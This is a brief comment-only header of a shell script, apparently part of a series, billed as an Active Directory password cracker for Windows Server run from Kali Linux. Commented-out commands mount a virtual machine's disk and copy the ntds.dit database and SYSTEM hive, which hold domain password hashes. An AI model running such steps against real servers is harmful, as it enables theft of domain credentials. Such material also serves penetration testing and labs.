# Windows Server 2012/2016 AD Password Cracker script Part III.
# Jan 2017, M. Long
#
# This script automates the process of installing several necessary tools into Kali Linux 2016.2012/2016
# Credit for most of this to: http://hackers-workshop.net/how-to-install-smbexec2-on-kali-linux

#This section is used to mount the VM's drive, copy the ntds.dit database, the system key, and then unmount the drive.
#mount /dev/sda2 /mnt
#cp /mnt/Windows/NTDS/ntds.dit ~
#cp /mnt/Windows/System32/config/SYSTEM ~
#umount /mnt
